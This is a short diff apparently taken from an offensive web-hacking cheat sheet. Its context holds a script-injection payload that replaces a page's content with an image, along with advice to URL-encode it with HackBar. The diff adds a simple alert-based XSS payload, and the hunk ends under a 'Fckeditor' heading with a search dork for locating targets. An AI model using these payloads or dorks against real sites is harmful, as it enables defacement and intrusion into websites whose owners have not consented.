@@ -68,6 +68,9 @@ exploit :
 
 "<script>document.body.innerHTML=" <img src='https://avatars.githubusercontent.com/u/103410775?s=400&u=9835014f4ab089eec642bc76c019c99231337db4&v=4'>"</script> AND URLENCODE ME WITH HACKBAR
 
+<script><button onClick="alert('xss')">Submit</button></script>
+
+
 # Fckeditor
 
 inurl:"frame=product_detail"
